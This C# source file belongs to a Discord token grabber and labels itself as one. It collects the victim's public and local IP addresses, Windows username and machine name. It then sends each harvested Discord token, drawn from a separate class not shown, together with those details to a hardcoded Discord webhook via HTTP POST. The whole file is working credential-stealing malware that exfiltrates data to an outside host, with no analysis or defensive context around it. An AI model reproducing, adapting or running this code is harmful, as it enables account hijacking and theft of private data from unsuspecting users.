using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Token_Grabber
{
    public class PAI
    {
        public static string giwl = ("https://api.ipify.org/");
        public static string ii;
        public static string li;
        public static string whurl = "https://discord.com/api/webhooks/960218299042508860/asK8bqJGh8I2EKSgCw2cQgrjAhwiiujHwZ39nwjD5WMNI8DkfBAT33NJcDTpROhXZJtk";

        public PAI()
        {
            Run();
        }

        public static void Run()
        {
            GetLocalIPAddress();
            GetIp();

            string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \"\\n \\n \\n \\n \\n\", \"title\":\"Info:\", \"color\":16745830}] }";
            
            json = json.Insert(65, $"Public IP: {li}");
            json = json.Insert(79 + li.Length, $"Local IP: {ii}");
            json = json.Insert(92 + li.Length + ii.Length, $"Username: {Environment.UserName}");
            json = json.Insert(105 + Environment.UserName.Length + li.Length + ii.Length, $"PC Name: {Environment.MachineName}");


            //Filters through possible tokens
            foreach (string item in DT.ptkns)
            {
                try
                {
                    string virtualjson = json.Insert(117 + li.Length + Environment.UserName.Length + Environment.MachineName.Length + ii.Length, $"\\n Token: {item}");
                    STDWH(whurl, virtualjson);
                }
                catch { }
            }
        }
        


        #region Helpers
        public static void STDWH(string URL, string escapedjson)
        {
            var wr = WebRequest.Create(URL);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream()))
                sw.Write(escapedjson);
            wr.GetResponse();
        }
        public static void GetIp()
        {
            string ip = new WebClient().DownloadString(giwl);
            li = ip;
        }
        public static void GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    ii = ip.ToString();
                }
            }
        }

        #endregion

    }
}
